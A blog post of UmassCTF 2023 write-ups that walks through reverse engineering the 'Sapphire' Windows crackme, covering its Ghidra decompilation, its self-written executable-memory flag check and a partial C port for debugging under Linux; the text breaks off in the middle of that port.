<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
<title>UmassCTF 2023 writeups | poni’s blog</title>
<meta name="generator" content="Jekyll v3.9.2" />
<meta property="og:title" content="UmassCTF 2023 writeups" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Intro This week I had the pleasure to play UmassCTF 2023 with a small team that we created with other people from around the internet. Hope the team sticks together for years to come but we’ll see. Overall we got 8th place which I think is decent. Sadly there was only two pwns, the first was easy and the second one was comparatively hard, so instead I focused on helping with the easier revs. Personally I solved one pwn and two reversing challs. One rev, even though pretty cool, was straightforward after you understand the gimmick of the challenge so I’m gonna skip writing the writeup for it. You can also read all the writeups from our team on our website. :)" />
<meta property="og:description" content="Intro This week I had the pleasure to play UmassCTF 2023 with a small team that we created with other people from around the internet. Hope the team sticks together for years to come but we’ll see. Overall we got 8th place which I think is decent. Sadly there was only two pwns, the first was easy and the second one was comparatively hard, so instead I focused on helping with the easier revs. Personally I solved one pwn and two reversing challs. One rev, even though pretty cool, was straightforward after you understand the gimmick of the challenge so I’m gonna skip writing the writeup for it. You can also read all the writeups from our team on our website. :)" />
<link rel="canonical" href="https://poniponiponiponiponiponiponiponiponi.github.io/ctf/rev/pwn/c/2023/03/28/UmassCTF-Writeups.html" />
<meta property="og:url" content="https://poniponiponiponiponiponiponiponiponi.github.io/ctf/rev/pwn/c/2023/03/28/UmassCTF-Writeups.html" />
<meta property="og:site_name" content="poni’s blog" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2023-03-28T00:00:00+00:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="UmassCTF 2023 writeups" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-03-28T00:00:00+00:00","datePublished":"2023-03-28T00:00:00+00:00","description":"Intro This week I had the pleasure to play UmassCTF 2023 with a small team that we created with other people from around the internet. Hope the team sticks together for years to come but we’ll see. Overall we got 8th place which I think is decent. Sadly there was only two pwns, the first was easy and the second one was comparatively hard, so instead I focused on helping with the easier revs. Personally I solved one pwn and two reversing challs. One rev, even though pretty cool, was straightforward after you understand the gimmick of the challenge so I’m gonna skip writing the writeup for it. You can also read all the writeups from our team on our website. :)","headline":"UmassCTF 2023 writeups","mainEntityOfPage":{"@type":"WebPage","@id":"https://poniponiponiponiponiponiponiponiponi.github.io/ctf/rev/pwn/c/2023/03/28/UmassCTF-Writeups.html"},"url":"https://poniponiponiponiponiponiponiponiponi.github.io/ctf/rev/pwn/c/2023/03/28/UmassCTF-Writeups.html"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="https://poniponiponiponiponiponiponiponiponi.github.io/feed.xml" title="poni&apos;s blog" /></head>
<body><header class="site-header" role="banner">

  <div class="wrapper"><a class="site-title" rel="author" href="/">poni&#39;s blog</a><nav class="site-nav">
        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
        <label for="nav-trigger">
          <span class="menu-icon">
            <svg viewBox="0 0 18 15" width="18px" height="15px">
              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
            </svg>
          </span>
        </label>

        <div class="trigger"><a class="page-link" href="/about/">About</a><a class="page-link" href="/about/software">Software I use and why</a></div>
      </nav></div>
</header>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title p-name" itemprop="name headline">UmassCTF 2023 writeups</h1>
    <p class="post-meta">
      <time class="dt-published" datetime="2023-03-28T00:00:00+00:00" itemprop="datePublished">Mar 28, 2023
      </time></p>
  </header>

  <div class="post-content e-content" itemprop="articleBody">
    <h1 id="intro">Intro</h1>
<p>This week I had the pleasure to play UmassCTF 2023 with a small team that we
created with other people from around the internet. Hope the team sticks
together for years to come but we’ll see. Overall we got 8th place which I
think is decent. Sadly there was only two pwns, the first was easy and the
second one was comparatively hard, so instead I focused on helping with the
easier revs. Personally I solved one pwn and two reversing challs. One rev,
even though pretty cool, was straightforward after you understand the gimmick
of the challenge so I’m gonna skip writing the writeup for it. You can also
read all the writeups from our team <a href="https://ctf.cve2k9.club/">on our website</a>.
:)</p>

<h1 id="sapphire">Sapphire</h1>
<blockquote>
  <p>Description: Do you know both sapphire and ruby are corundum?
The difference that makes ruby blood-red colored is the addition
of Chromium.</p>
</blockquote>

<p>In this challenge we get an .exe Windows binary, <code class="language-plaintext highlighter-rouge">./sapphire.exe</code>. First by
running the <code class="language-plaintext highlighter-rouge">file</code> command we can see it’s a 32-bit binary.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  umass file ~/Downloads/sapphire.exe
/home/tabun-dareka/Downloads/sapphire.exe: PE32 executable (console) Intel 80386, for MS Windows, 4 sections
</code></pre></div></div>

<p>To get an idea of what the program is doing we can run it. I’m on Linux so I run it through wine.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  umass wine ~/Downloads/sapphire.exe
007c:fixme:hid:handle_IRP_MN_QUERY_ID Unhandled type 00000005
007c:fixme:hid:handle_IRP_MN_QUERY_ID Unhandled type 00000005
007c:fixme:hid:handle_IRP_MN_QUERY_ID Unhandled type 00000005
007c:fixme:hid:handle_IRP_MN_QUERY_ID Unhandled type 00000005
007c:fixme:wineusb:query_id Unhandled ID query type 0x5.
AAAAAAAAAAAAAAAA
➜  umass
</code></pre></div></div>

<p>The program wants some input and after that It doesn’t do anything. We can make
an educated guess that the program is a crackme type of challenge and the input
is the flag that is later checked. Later it turns out to be true. Let’s open up
Ghidra and do some reversing! Now, I never reversed a Windows binary so I’m not
sure where to start looking. I went with a top-down approach, first looking at
strings in the program and surely we found something useful.</p>

<p><img src="/files/Umass2023-1.png" alt="Image" /></p>

<p>There’s a “correct flag” type of string, so we can check the XRef’s in Ghidra
to see where the string is referenced. Bingo! We find a function that looks
like a main function, so I’m gonna rename it as <code class="language-plaintext highlighter-rouge">main</code>. There’s the full Ghidra
decompilation:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">FILE</span> <span class="o">*</span><span class="n">_File</span><span class="p">;</span>
  <span class="kt">size_t</span> <span class="n">str_len</span><span class="p">;</span>
  <span class="kt">size_t</span> <span class="n">_MaxCount</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">iVar1</span><span class="p">;</span>
  <span class="kt">char</span> <span class="n">str</span> <span class="p">[</span><span class="mi">6</span><span class="p">];</span>
  <span class="kt">char</span> <span class="n">after_str</span> <span class="p">[</span><span class="mi">73</span><span class="p">];</span>
  <span class="n">undefined</span> <span class="n">local_11</span><span class="p">;</span>
  <span class="n">undefined4</span> <span class="n">local_10</span><span class="p">;</span>
  <span class="n">undefined2</span> <span class="n">local_c</span><span class="p">;</span>
  <span class="n">undefined</span> <span class="n">local_a</span><span class="p">;</span>
  <span class="n">uint</span> <span class="n">local_8</span><span class="p">;</span>
  
  <span class="n">local_8</span> <span class="o">=</span> <span class="n">DAT_004030b8</span> <span class="o">^</span> <span class="p">(</span><span class="n">uint</span><span class="p">)</span><span class="o">&amp;</span><span class="n">stack0xfffffffc</span><span class="p">;</span>
  <span class="n">memset</span><span class="p">(</span><span class="n">str</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x50</span><span class="p">);</span>
  <span class="n">_File</span> <span class="o">=</span> <span class="p">(</span><span class="kt">FILE</span> <span class="o">*</span><span class="p">)</span><span class="n">__acrt_iob_func</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
  <span class="n">fgets</span><span class="p">(</span><span class="n">str</span><span class="p">,</span><span class="mh">0x50</span><span class="p">,</span><span class="n">_File</span><span class="p">);</span>
  <span class="n">local_11</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">str_len</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">str</span><span class="p">);</span>
  <span class="n">local_10</span> <span class="o">=</span> <span class="mh">0x53414d55</span><span class="p">;</span>
  <span class="n">local_c</span> <span class="o">=</span> <span class="mh">0x7b53</span><span class="p">;</span>
  <span class="n">local_a</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">_MaxCount</span> <span class="o">=</span> <span class="n">str_len</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="mi">5</span> <span class="o">&lt;</span> <span class="n">str_len</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">_MaxCount</span> <span class="o">=</span> <span class="mi">6</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="n">iVar1</span> <span class="o">=</span> <span class="n">strncmp</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">local_10</span><span class="p">,</span><span class="n">str</span><span class="p">,</span><span class="n">_MaxCount</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">((((</span><span class="n">iVar1</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">after_str</span><span class="p">[</span><span class="n">str_len</span> <span class="o">-</span> <span class="mi">7</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'}'</span><span class="p">))</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="mi">6</span> <span class="o">&lt;</span> <span class="n">str_len</span><span class="p">))</span> <span class="o">&amp;&amp;</span>
     <span class="p">(</span><span class="n">iVar1</span> <span class="o">=</span> <span class="n">check_fun</span><span class="p">(</span><span class="n">after_str</span><span class="p">,</span><span class="n">str_len</span> <span class="o">-</span> <span class="mi">7</span><span class="p">),</span> <span class="n">iVar1</span> <span class="o">==</span> <span class="mi">0</span><span class="p">))</span> <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"You have found the flag!"</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="n">FUN_00401175</span><span class="p">(</span><span class="n">local_8</span> <span class="o">^</span> <span class="p">(</span><span class="n">uint</span><span class="p">)</span><span class="o">&amp;</span><span class="n">stack0xfffffffc</span><span class="p">);</span>
  <span class="k">return</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>We can see that the program reads 0x50 bytes of input and then checks it
against some conditions. Maybe it’s hard too see at first glance, but the check
against the numbers:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  local_10 = 0x53414d55;
  local_c = 0x7b53;
</code></pre></div></div>

<p>is just an optimized check if our string begins with the bytes <code class="language-plaintext highlighter-rouge">UMASS{</code> and we
also check if the string ends with <code class="language-plaintext highlighter-rouge">}</code>. Then it checks the input against some
function that I renamed as <code class="language-plaintext highlighter-rouge">check_fun</code> . This is where the real challenge
begins. There’s the Ghidra’s decompilation of check_fun:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">undefined4</span> <span class="kr">__cdecl</span> <span class="nf">check_fun</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">flag</span><span class="p">,</span><span class="n">undefined4</span> <span class="n">len</span><span class="p">)</span>

<span class="p">{</span>
  <span class="n">undefined4</span> <span class="n">local_c</span><span class="p">;</span>
  <span class="n">undefined4</span> <span class="n">local_8</span><span class="p">;</span>
  <span class="n">code</span> <span class="o">*</span><span class="n">codee1</span><span class="p">;</span>
  
  <span class="n">local_c</span> <span class="o">=</span> <span class="mh">0xffffffff</span><span class="p">;</span>
  <span class="n">local_8</span> <span class="o">=</span> <span class="mh">0xffffffff</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">codeeee</span> <span class="o">==</span> <span class="p">(</span><span class="n">code</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">codeeee</span> <span class="o">=</span> <span class="p">(</span><span class="n">code</span> <span class="o">*</span><span class="p">)</span><span class="n">VirtualAlloc</span><span class="p">((</span><span class="n">LPVOID</span><span class="p">)</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0xb2</span><span class="p">,</span><span class="mh">0x3000</span><span class="p">,</span><span class="mh">0x40</span><span class="p">);</span>
                    <span class="cm">/* o */</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="n">codeeee</span><span class="p">,</span><span class="o">&amp;</span><span class="n">orig_code</span><span class="p">,</span><span class="mh">0xb2</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="o">*</span><span class="p">(</span><span class="n">code</span> <span class="o">**</span><span class="p">)(</span><span class="n">codeeee</span> <span class="o">+</span> <span class="mi">10</span><span class="p">)</span> <span class="o">=</span> <span class="n">codeeee</span> <span class="o">+</span> <span class="mh">0x3e</span><span class="p">;</span>
  <span class="o">*</span><span class="p">(</span><span class="n">undefined4</span> <span class="o">*</span><span class="p">)(</span><span class="n">codeeee</span> <span class="o">+</span> <span class="mh">0x3f</span><span class="p">)</span> <span class="o">=</span> <span class="n">len</span><span class="p">;</span>
  <span class="n">codee1</span> <span class="o">=</span> <span class="n">codeeee</span><span class="p">;</span>
  <span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">**</span><span class="p">)(</span><span class="n">codeeee</span> <span class="o">+</span> <span class="mh">0x4c</span><span class="p">)</span> <span class="o">=</span> <span class="n">flag</span><span class="p">;</span>
  <span class="o">*</span><span class="p">(</span><span class="n">undefined4</span> <span class="o">*</span><span class="p">)(</span><span class="n">codee1</span> <span class="o">+</span> <span class="mh">0x50</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">codee1</span> <span class="o">=</span> <span class="n">codeeee</span><span class="p">;</span>
  <span class="o">*</span><span class="p">(</span><span class="n">code</span> <span class="o">**</span><span class="p">)(</span><span class="n">codeeee</span> <span class="o">+</span> <span class="mh">0x56</span><span class="p">)</span> <span class="o">=</span> <span class="n">codeeee</span> <span class="o">+</span> <span class="mh">0xf</span><span class="p">;</span>
  <span class="o">*</span><span class="p">(</span><span class="n">undefined4</span> <span class="o">*</span><span class="p">)(</span><span class="n">codee1</span> <span class="o">+</span> <span class="mh">0x5a</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">codee1</span> <span class="o">=</span> <span class="n">codeeee</span><span class="p">;</span>
  <span class="o">*</span><span class="p">(</span><span class="n">undefined4</span> <span class="o">**</span><span class="p">)(</span><span class="n">codeeee</span> <span class="o">+</span> <span class="mh">0x9d</span><span class="p">)</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">local_c</span><span class="p">;</span>
  <span class="o">*</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)(</span><span class="n">codee1</span> <span class="o">+</span> <span class="mh">0xa1</span><span class="p">)</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="o">&amp;</span><span class="n">local_c</span> <span class="o">&gt;&gt;</span> <span class="mh">0x1f</span><span class="p">;</span>
  <span class="o">*</span><span class="p">(</span><span class="n">code</span> <span class="o">**</span><span class="p">)(</span><span class="n">codeeee</span> <span class="o">+</span> <span class="mh">0xab</span><span class="p">)</span> <span class="o">=</span> <span class="n">codeeee</span> <span class="o">+</span> <span class="mh">0xb1</span><span class="p">;</span>
  <span class="p">(</span><span class="o">*</span><span class="n">codeeee</span><span class="p">)();</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">codeeee</span> <span class="o">!=</span> <span class="p">(</span><span class="n">code</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">VirtualFree</span><span class="p">(</span><span class="n">codeeee</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x8000</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">local_c</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Now this looks a little scary… We allocate some executable memory and copy
<code class="language-plaintext highlighter-rouge">orig_code</code> to it, orig_code is a global variable with random bytes that turn
out to be assembly instructions. Then we write to the allocated memory some
things like the string length and some addresses, and after that we call the
memory like if it was some function. So the main challenge is figuring out what
happens in the allocated memory. At the begging I wanted to use my old Windows
hard drive that is lying around and poke at the program with windbg. After
fighting 30 minutes with windbg and installing mingw-gdb on Windows in which
80% of the options didn’t work, it turns out that I’m absolutely abysmal at
using Windows, having big troubles even putting a breakpoint there (idk if it’s
something that I should be proud of or ashamed of). So I had to change my
approach. Because I’m a mad crazy person I decided to rewrite the whole program
in c, so I can compile it on Linux to work on it with gdb and an environment
that I’m used to. There’s my source code:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// compile with -m32!!!</span>

<span class="cp">#include &lt;stdio.h&gt;
#include &lt;memory.h&gt;
#include &lt;sys/mman.h&gt;
</span>
<span class="kt">char</span> <span class="n">orig_code</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
    <span class="mh">0x6a</span><span class="p">,</span> <span class="mh">0x03</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0xc1</span><span class="p">,</span> <span class="mh">0xe0</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0x03</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x98</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span>
    <span class="mh">0x3f</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">,</span> <span class="mh">0xcb</span><span class="p">,</span> <span class="mh">0xca</span><span class="p">,</span> <span class="mh">0xe2</span><span class="p">,</span> <span class="mh">0x0d</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0xd4</span><span class="p">,</span> <span class="mh">0xe4</span><span class="p">,</span> <span class="mh">0x19</span><span class="p">,</span> <span class="mh">0x87</span><span class="p">,</span> <span class="mh">0xe4</span><span class="p">,</span>
    <span class="mh">0xe8</span><span class="p">,</span> <span class="mh">0x09</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xdc</span><span class="p">,</span> <span class="mh">0xe4</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">,</span> <span class="mh">0xd0</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">,</span> <span class="mh">0xc1</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">,</span> <span class="mh">0xe8</span><span class="p">,</span>
    <span class="mh">0xe4</span><span class="p">,</span> <span class="mh">0xcf</span><span class="p">,</span> <span class="mh">0x43</span><span class="p">,</span> <span class="mh">0x1e</span><span class="p">,</span> <span class="mh">0x1e</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0x85</span><span class="p">,</span> <span class="mh">0xc6</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0xcf</span><span class="p">,</span> <span class="mh">0x8d</span><span class="p">,</span> <span class="mh">0x1a</span><span class="p">,</span>
    <span class="mh">0xc0</span><span class="p">,</span> <span class="mh">0x19</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">,</span> <span class="mh">0xf2</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">,</span> <span class="mh">0x23</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0xee</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0x3f</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span> <span class="mh">0xd4</span><span class="p">,</span>
    <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0xb8</span><span class="p">,</span> <span class="mh">0xca</span><span class="p">,</span> <span class="mh">0x5d</span><span class="p">,</span> <span class="mh">0xa9</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0xe8</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0x85</span><span class="p">,</span> <span class="mh">0xc0</span><span class="p">,</span>
    <span class="mh">0x75</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0xb8</span><span class="p">,</span> <span class="mh">0xb2</span><span class="p">,</span> <span class="mh">0x0d</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0xa5</span><span class="p">,</span> <span class="mh">0x94</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0xc7</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span>
    <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0xb9</span><span class="p">,</span> <span class="mh">0x8f</span><span class="p">,</span> <span class="mh">0x7f</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0xba</span><span class="p">,</span> <span class="mh">0xdd</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xf6</span><span class="p">,</span>
    <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x8d</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0x3c</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x8d</span><span class="p">,</span> <span class="mh">0x4e</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x4c</span><span class="p">,</span> <span class="mh">0x8d</span><span class="p">,</span> <span class="mh">0x96</span><span class="p">,</span> <span class="mh">0xd3</span><span class="p">,</span>
    <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x4c</span><span class="p">,</span> <span class="mh">0x8d</span><span class="p">,</span> <span class="mh">0x9e</span><span class="p">,</span> <span class="mh">0xf7</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span>
    <span class="mh">0xfe</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">,</span> <span class="mh">0x1f</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x8a</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xd0</span><span class="p">,</span> <span class="mh">0xc8</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">,</span>
    <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mh">0xd0</span><span class="p">,</span> <span class="mh">0x84</span><span class="p">,</span> <span class="mh">0xc0</span><span class="p">,</span> <span class="mh">0x87</span><span class="p">,</span> <span class="mh">0xca</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span> <span class="mh">0x87</span><span class="p">,</span> <span class="mh">0xd1</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span>
    <span class="mh">0x87</span><span class="p">,</span> <span class="mh">0xda</span><span class="p">,</span> <span class="mh">0x75</span><span class="p">,</span> <span class="mh">0x07</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x8d</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0xeb</span><span class="p">,</span> <span class="mh">0xdb</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span>
    <span class="mh">0xba</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span> <span class="mh">0x99</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x3a</span><span class="p">,</span> <span class="mh">0xcf</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0x2e</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span>
    <span class="mh">0x6a</span><span class="p">,</span> <span class="mh">0x23</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0xcb</span><span class="p">,</span> <span class="mh">0xc3</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span>
    <span class="mh">0xb1</span><span class="p">,</span> <span class="mh">0x19</span><span class="p">,</span> <span class="mh">0xbf</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span> <span class="mh">0x4e</span><span class="p">,</span> <span class="mh">0xe6</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="mh">0xbb</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span>
    <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span>
    <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span>
<span class="p">};</span>

<span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">code_ptr</span><span class="p">)()</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>

<span class="kt">int</span> <span class="nf">check_fun</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">flag</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">len</span><span class="p">);</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
    <span class="kt">char</span> <span class="n">beg</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"UMASS{"</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">flag</span><span class="p">[</span><span class="mh">0x50</span><span class="p">];</span>
    <span class="n">memset</span><span class="p">(</span><span class="n">flag</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">);</span>
    <span class="n">fgets</span><span class="p">(</span><span class="n">flag</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
    <span class="c1">// I think we need to remove the newline??</span>
    <span class="n">flag</span><span class="p">[</span><span class="n">strcspn</span><span class="p">(</span><span class="n">flag</span><span class="p">,</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

    <span class="kt">size_t</span> <span class="n">str_len</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">flag</span><span class="p">);</span>
    <span class="kt">size_t</span> <span class="n">max_count</span> <span class="o">=</span> <span class="n">str_len</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="mi">5</span> <span class="o">&lt;</span> <span class="n">str_len</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">max_count</span> <span class="o">=</span> <span class="mi">6</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="kt">int</span> <span class="n">cmp</span> <span class="o">=</span> <span class="n">strncmp</span><span class="p">(</span><span class="n">beg</span><span class="p">,</span> <span class="n">flag</span><span class="p">,</span> <span class="n">max_count</span><span class="p">);</span>
    <span class="kt">int</span> <span class="n">ret</span><span class="p">;</span>
